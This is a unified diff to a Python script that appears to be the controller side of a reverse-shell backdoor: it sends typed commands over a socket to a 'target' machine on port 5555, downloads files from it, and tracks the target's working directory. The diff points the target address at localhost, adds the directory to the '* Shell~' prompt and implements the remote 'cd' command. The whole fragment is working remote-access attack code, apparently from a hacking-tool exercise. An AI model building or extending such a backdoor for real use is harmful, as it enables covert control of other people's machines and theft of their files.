@@ -8,7 +8,7 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
 
-target_ip = '192.168.203.142'
+target_ip = '127.0.0.1'
 target_port = 5555
 
 # Function to send data reliably as JSON-encoded strings
@@ -64,9 +64,10 @@ def download_file(file_name):
 
 # Function for the main communication loop with the target
 def target_communication():
+    dir = ''
     while True:
         # Prompt the user for a command to send to the target.
-        command = input('* Shell~%s: ' % str(ip))
+        command = input(f'* Shell~{str(ip)}: {dir}$ ')
         # Send the user's command to the target using the reliable_send function.
         reliable_send(command)
         if command == 'quit':
@@ -76,8 +77,8 @@ def target_communication():
             # If the user enters 'clear', clear the terminal screen.
             os.system('clear')
         elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target (not implemented).
-            pass
+            # If the user enters 'cd', change the current directory on the target.
+            dir = reliable_recv() + ' '
         elif command[:8] == 'download':
             # If the user enters 'download', initiate the download of a file from the target.
             download_file(command[9:])
